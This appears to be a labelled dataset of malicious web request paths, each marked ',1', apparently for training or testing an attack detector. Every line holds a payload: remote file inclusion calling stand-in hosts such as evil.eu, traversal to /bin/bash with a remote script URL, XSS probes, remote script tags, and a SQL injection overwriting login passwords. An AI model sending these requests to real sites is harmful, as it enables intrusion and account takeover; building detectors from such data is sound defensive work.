/blog/our-proposals/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/files/js/editor.js/?file=http://evil.eu/sh,1
/core/files/js/editor.js/?post=%3script>alert(1);,1
/?post=%3script>alert(1);,1
/index.php/?file=http://evil.eu/sh,1
/index.php/?userid=bob'; update logintable set passwd='0wn3d';--/login.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/api/v1/customers/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/orders/?file=http://evil.eu/sh,1
/register.php/?post=%3script>alert(1);,1
/login.php/?file=http://evil.eu/sh,1
/orders.php/?userid=bob'; update logintable set passwd='0wn3d';--/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/themes/theme.inc/?file=http://evil.eu/sh,1
/api/v1/login/?file=http://evil.eu/sh,1
/connection.php/?post=%3script>alert(1);,1
/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/register/?post=%3script>alert(1);,1
/login.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/core/files/js/upload.js/?file=http://evil.eu/sh,1
/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/cgi-bin/count.cgi/?file=http://evil.eu/sh,1
/orders.php/?post=%3script>alert(1);,1
/?file=http://evil.eu/sh,1
/update.php/?file=http://evil.eu/sh,1
/api/v1/login/?post=%3script>alert(1);,1
/index.php/?post=%3script>alert(1);,1
/authorize.php/?post=%3script>alert(1);,1
/index.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/blog/better-products-for-2019/?file=http://evil.eu/root.asp,1
/orders.php/?file=http://evil.eu/sh,1
/index.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/login.php/?page=http://192.168.80.128/rfi.php,1
/core/themes/theme.inc/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/connection.php/?file=http://evil.eu/sh,1
/core/files/js/upload.js/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/register/?file=http://evil.eu/sh,1
/core/files/js/editor.js/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/login.php/?post=%3script>alert(1);,1
/register.php/?file=http://evil.eu/root.asp,1
/api/v1/register/?userid=bob'; update logintable set passwd='0wn3d';--/index.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/cgi-bin/count.cgi/?post=%3script>alert(1);,1
/api/v1/orders/?post=%3script>alert(1);,1
/api/v1/login/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/register.php/?file=http://evil.eu/sh,1
/orders.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/?userid=bob'; update logintable set passwd='0wn3d';--/?file=http://evil.eu/root.asp,1
/cgi-bin/count.cgi/?file=http://evil.eu/root.asp,1
/api/v1/customers/?file=http://evil.eu/root.asp,1
/cgi-bin/count.cgi/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/connection.php/?page=http://192.168.80.128/rfi.php,1
/api/v1/customers/?post=%3script>alert(1);,1
/orders.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/connection.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/core/themes/theme.inc/?post=%3script>alert(1);,1
/register.php/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/api/v1/orders/?page=http://192.168.80.128/rfi.php,1
/update.php/?post=%3script>alert(1);,1
/register.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/index.php/?file=http://evil.eu/root.asp,1
/api/v1/register/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/blog/our-proposals/?file=http://evil.eu/sh,1
/xmlrpc.php/?post=%3script>alert(1);,1
/login.php/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/orders.php/?page=http://192.168.80.128/rfi.php,1
/core/files/js/editor.js/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/authorize.php/?data=<script src=http://www.hacckingplace.com/nasty.js></script>,1
/api/v1/orders/?cmd=pwd&page=http://hackersite.com/dsfsdasfsd.php,1
/api/v1/orders/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/page/about-us/../../..//bin/bashhttp://www.dvvv23.cin/script.sh?,1
/authorize.php/?file=http://evil.eu/sh,1
